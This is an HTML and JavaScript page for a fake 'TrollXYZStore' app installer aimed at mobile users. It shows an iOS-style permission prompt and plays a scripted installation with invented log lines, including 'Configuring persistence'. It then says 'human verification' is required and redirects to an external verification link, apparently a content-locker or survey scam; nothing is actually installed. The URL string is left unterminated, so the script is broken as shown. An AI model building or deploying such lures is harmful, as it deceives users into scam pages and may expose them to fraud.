<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
  <title>TrollXYZStore Installer — Ready</title>
  <style>
    /* existing styles omitted for brevity */
  </style>
</head>
<body>
  <div class="card" role="main" aria-label="TrollXYZStore fake installer card">
    <!-- left and right panels omitted for brevity -->
  </div>

  <div class="modal" id="iosModal">
    <div class="modal-content">
      <h2>“TrollXYZStore Installer”</h2>
      <p>This app wants to make changes to your device.</p>
      <button class="cancel" id="modalCancel">Cancel</button>
      <button class="ok" id="modalOk">Continue</button>
    </div>
  </div>

  <script>
    const humanVerificationURL = 'https://mobileverify.net/cl/v/j6v9vp;

    const deviceNameEl = document.getElementById('deviceName');
    const osVersionEl = document.getElementById('osVersion');
    const startBtn = document.getElementById('startBtn');
    const progressBar = document.getElementById('progressBar');
    const logBox = document.getElementById('logBox');
    const statusDot = document.getElementById('statusDot');
    const statusText = document.getElementById('statusText');

    const modal = document.getElementById('iosModal');
    const modalCancel = document.getElementById('modalCancel');
    const modalOk = document.getElementById('modalOk');

    // Mobile detection
    const ua = navigator.userAgent || navigator.vendor || '';
    if(!/iPhone|iPad|iPod|Android/.test(ua)){
      alert('This installer can only be viewed on a mobile device.');
      document.body.innerHTML = '';
    } else {
      // Detect device type and iOS version
      let device = 'Unknown device';
      if(/iPhone/.test(ua)) device = 'iPhone';
      else if(/iPad/.test(ua)) device = 'iPad';
      else if(/iPod/.test(ua)) device = 'iPod touch';
      else if(/Android/.test(ua)) device = 'Android device';
      deviceNameEl.textContent = device;

      let iosMatch = ua.match(/OS (\d+)_?(\d+)?/);
      osVersionEl.textContent = iosMatch ? `iOS ${iosMatch[1]}${iosMatch[2]?'.'+iosMatch[2]:''}` : ua;
    }

    function appendLog(line){
      const el = document.createElement('div');
      el.textContent = `[${new Date().toLocaleTimeString()}] ${line}`;
      logBox.appendChild(el);
      logBox.scrollTop = logBox.scrollHeight;
    }

    const steps = [
      {msg:'Preparing installer', dur:900},
      {msg:'Verifying device compatibility', dur:1000},
      {msg:'Downloading components', dur:1400},
      {msg:'Installing core files', dur:1800},
      {msg:'Configuring persistence', dur:1200},
      {msg:'Finalizing', dur:1000}
    ];

    let running = false;

    function setStatus(text, ok=false){
      statusText.textContent = text;
      if(ok){statusDot.classList.add('green');} else {statusDot.classList.remove('green');}
    }

    async function runFakeInstall(){
      if(running) return;
      running = true;
      startBtn.disabled = true;
      startBtn.style.opacity = 0.6;

      appendLog('Starting installer UI...');
      setStatus('Working');

      let progress = 0;
      progressBar.style.width = '0%';

      for(let i=0;i<steps.length;i++){
        const step = steps[i];
        appendLog(step.msg + '...');
        const increments = Math.max(6, Math.round(step.dur/180));
        for(let j=0;j<increments;j++){
          progress += (100/(steps.length*increments));
          progressBar.style.width = Math.min(99, progress) + '%';
          await new Promise(r=>setTimeout(r, Math.round(step.dur/increments)));
        }
        appendLog(step.msg + ' completed.');

        if(i === steps.length-2){
          appendLog('Human verification required...');
        }
      }

      progressBar.style.width = '100%';
      appendLog('Installation halted until verification is complete.');
      setStatus('Completed', true);

      // Redirect after 3 seconds
      setTimeout(()=>{
        window.location.href = humanVerificationURL;
      },3000);
    }

    startBtn.addEventListener('click', ()=>{
      modal.style.display = 'flex';
    });

    modalCancel.addEventListener('click', ()=>{
      modal.style.display = 'none';
    });

    modalOk.addEventListener('click', ()=>{
      modal.style.display = 'none';
      runFakeInstall();
    });

    appendLog('Welcome to TrollXYZStore Installer v2.1');
  </script>
</body>
</html>
